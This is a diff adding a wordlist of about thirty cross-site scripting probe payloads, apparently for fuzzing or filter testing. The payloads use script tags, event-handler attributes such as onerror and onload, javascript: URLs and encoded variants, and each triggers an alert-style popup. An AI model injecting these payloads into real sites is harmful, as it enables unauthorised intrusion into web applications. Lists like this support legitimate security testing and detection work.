@@ -1,0 +1,30 @@
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<img/src=x onerror=alert(1)//>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+<math><mi><table><mglyph><svg><mtext><img src=x onerror=alert(1)>
+<input type=image src=x onerror=alert(1)>
+<object data=javascript:alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<embed src=javascript:alert(1)>
+<event-source src=javascript:alert(1)>
+<form><button formaction=javascript:alert(1)>click
+<base href=javascript:alert(1)//
+<frameset onload=alert(1)>
+<table background=javascript:alert(1)>
+<a onmouseover=alert(1)>hover</a>
